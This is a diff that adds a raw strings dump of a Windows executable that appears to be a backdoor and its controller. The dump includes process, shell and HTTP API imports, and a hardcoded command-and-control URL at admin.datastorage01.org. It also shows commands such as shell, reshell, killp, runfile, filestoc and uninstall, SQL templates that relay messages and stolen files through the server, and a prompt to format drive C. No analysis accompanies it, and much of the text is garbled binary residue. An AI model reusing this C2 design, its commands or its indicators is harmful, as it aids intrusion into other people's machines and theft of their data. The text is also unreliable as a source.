@@ -1,0 +1,306 @@
+!This program cannot be run in DOS mode.
+P|*Lq|
+P|AOu|
+P|AO{|
+P|j_"|
+P|AOt|
+P|Rich
+.text
+`.rdata
+@.data
+.rsrc
+T$$RPh
+D$\PQ
+T$4WRP
+QPj!R
+T$$SR
+D$(RPQj
+SVWPh
+D$0jKj
+D$hQhl
+T$hhT
+D$hRh@
+L$hh,
+RPj(j
+QRRRj
+V<=tR<-tN<_tJ<&tF<.tB<0|
+<9~:<A|
+<Z~2<a|
+L$(hX
+T$(hT
+D$$PWj
+VWVSh`
+T$4QR
+D$(hh
+D$ h(
+L$dSh
+t'h<,A
+L$2h 
+T$Hh 
+D$JWh
+_^][t!
+D$lUP
+L$0h(,A
+T$4QRh(+A
+L$lUQ
+T$pUR
+~Qh(*A
+t5h(+A
+L$ Qh
+SUVW3
+SSShPg@
+RRISQ
+IRSQQh
+QShp-A
+RShp-A
+L$rPQ
+D$.RPh
+Sleep
+GetLastError
+Process32Next
+OpenProcess
+CloseHandle
+Process32First
+CreateToolhelp32Snapshot
+Module32First
+FindNextFileA
+FindFirstFileA
+GlobalFree
+DeleteFileA
+GetExitCodeProcess
+CreateProcessA
+CopyFileA
+GetTempPathA
+GetSystemDirectoryA
+GetStartupInfoA
+GetStdHandle
+TerminateProcess
+AllocConsole
+GetEnvironmentVariableA
+lstrcatA
+lstrcpyA
+GetShortPathNameA
+GetModuleFileNameA
+WriteFile
+FreeConsole
+CreateMutexA
+WinExec
+CreateThread
+CreatePipe
+ReadFile
+PeekNamedPipe
+GetLocalTime
+KERNEL32.dll
+USER32.dll
+LookupAccountSidA
+GetTokenInformation
+OpenProcessToken
+ADVAPI32.dll
+ShellExecuteA
+SHELL32.dll
+?_Copy@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEXI@Z
+?_Tidy@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@AAEX_N@Z
+?_Xlen@std@@YAXXZ
+?_C@?1??_Nullstr@?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@CAPBDXZ@4DB
+MSVCP60.dll
+InternetConnectA
+InternetOpenA
+InternetCloseHandle
+InternetCrackUrlA
+HttpSendRequestA
+HttpAddRequestHeadersA
+HttpOpenRequestA
+InternetSetOptionA
+InternetQueryOptionA
+HttpEndRequestA
+InternetWriteFile
+HttpSendRequestExA
+InternetReadFile
+HttpQueryInfoA
+WININET.dll
+malloc
+strncmp
+__CxxFrameHandler
+sprintf
+getenv
+printf
+freopen
+srand
+strstr
+_itoa
+strtok
+scanf
+fflush
+strftime
+localtime
+fclose
+fwrite
+fseek
+fopen
+fread
+ftell
+system
+MSVCRT.dll
+__dllonexit
+_onexit
+_exit
+_XcptFilter
+__p___initenv
+__getmainargs
+_initterm
+__setusermatherr
+_adjust_fdiv
+__p__commode
+__p__fmode
+__set_app_type
+_except_handler3
+_controlfp
+WS2_32.dll
+Content-Type: application/x-www-form-urlencoded
+https
+Mozilla/4.0 (compatible; )
+Accept: */*
+HTTP/1.0
+Content-Length: %d
+%d:%s %d
+     Executable     = %s
+windir
+USERPROFILE
+%s\%s
+%s\%s
+PROXY_TYPE_DIRECT
+PROXY_TYPE_PROXY:%s
+PROXY_TYPE_AUTO_DETECT
+PROXY_TYPE_AUTO_PROXY_URL:%s
+InternetQueryOption failed! (%d)
+rusinfo.exe
+\cmd.exe
+CONIN$
+CONOUT$
+ComSpec
+ >> NUL
+/c del 
+Are you sure to FORMAT Disk C With NTFS?(Y/N)
+letusgohtppmmv2.0.0.1
+http://admin.datastorage01.org/images/1.asp
+sleep
+remove
+filestoc
+filectos
+runfile
+printf
+killp
+listp
+reshell
+shell
+mname
+%Y/%m/%d %X %z
+<Td name1='messagename' name2='10'>
+<Td name1='messagecontent' name2='9'>
+<Td name1='messagepieceindex' name2='8'>
+<Td name1='messagepiecelength' name2='7'>
+<Td name1='messagetotallength' name2='6'>
+<Td name1='encodenum' name2='5'>
+<Td name1='toid' name2='4'>
+<Td name1='fromid' name2='3'>
+<Td name1='messageaction' name2='2'>
+<Td name1='id' name2='1'>
+</Td>
+<Td name1='filecontent' name2='8'>
+<Td name1='filehash' name2='7'>
+<Td name1='filename' name2='6'>
+<Td name1='filepieceindex' name2='5'>
+<Td name1='filepiecelength' name2='4'>
+<Td name1='filetotallength' name2='3'>
+<Td name1='encodenum' name2='2'>
+Cant open file!
+piece %d not found error!
+net error!
+Down file ok!
+%d/%d down!
+select * from tab_file where filename='%s' and filepieceindex=%d
+select top 1 * from tab_file where filename='%s' order by id asc
+Send file ok!
+%d/%d sent!
+select id from tab_file where filename='%s' and filepieceindex=%d
+select top 1 * from tab_message where toid = '%s' order by id asc
+insert into tab_message (messageaction,fromid,toid,encodenum,messagetotallength,messagepiecelength,messagepieceindex,messagecontent,messagename) values ('%s','%s','%s',%s,%s,%s,%s,'%s','%s')
+insert into tab_file (encodenum,filetotallength,filepiecelength,filepieceindex,filecontent,filename,filehash) values (%s,%s,%s,%s,'%s','%s','%s')
+update tab_online set lasttime = '%s' where regcode = '%s'
+insert into tab_online (mode,clientname,clientip,accessip,onlinetime,lasttime,regcode) values ('%d','%s','%s','%s','%s','%s','%s')
+select id from tab_online where regcode = '%s' order by id asc
+%d-%02d-%02d %02d:%02d:%02d
+acc ok
+id="param1" size="100" value="
+%s?%s
+rands=%s&acc=%s&str=%s
+str=%s
+%s?rands=%s&acc=%s
+id="param5" value="
+id="param4" value="
+?rands=
+regcode:%s
+<Td name1='regcode' name2='8'>
+lasttime:%s
+<Td name1='lasttime' name2='7'>
+onlinetime:%s
+<Td name1='onlinetime' name2='6'>
+accessip:%s
+<Td name1='accessip' name2='5'>
+clientip:%s
+<Td name1='clientip' name2='4'>
+clientname:%s
+<Td name1='clientname' name2='3'>
+mode:%s
+<Td name1='mode' name2='2'>
+id:%s
+select * from tab_online order by id asc
+select * from tab_online where id=%s
+delete from tab_online where id=%s
+delete from tab_online
+delete from tab_message where id=%s
+delete from tab_message
+delete from tab_file where filename='%s'
+delete from tab_file
+messagename:%s
+messagepieceindex:%s
+messagepiecelength:%s
+messagetotallength:%s
+encodenum:%s
+toid:%s
+fromid:%s
+messageaction:%s
+select * from tab_message order by id asc
+select * from tab_message where id=%s
+filelength:%s
+filepiece:%s
+<Td name1='filepieceindex' name2='4'>
+filepiecelength:%s
+<Td name1='filepiecelength' name2='3'>
+filelength:%s
+<Td name1='filetotallength' name2='2'>
+filename:%s
+<Td name1='filename' name2='1'>
+select distinct filename,filetotallength from tab_file
+select filename,filetotallength,filepiecelength,filepieceindex from tab_file where filename='%s' order by id asc
+Command Error!
+uninstall
+putfile
+getfile
+Pls choose target first!
+downfile
+upfile
+quitz
+connect
+debugmessage
+debugclient
+debugfile
+delfile
+delmessage
+delclient
+listfiles
+listmessages
+listclients
+enter
+Alert!Pls press enter to make sure!
+(info)%s->%s:%s
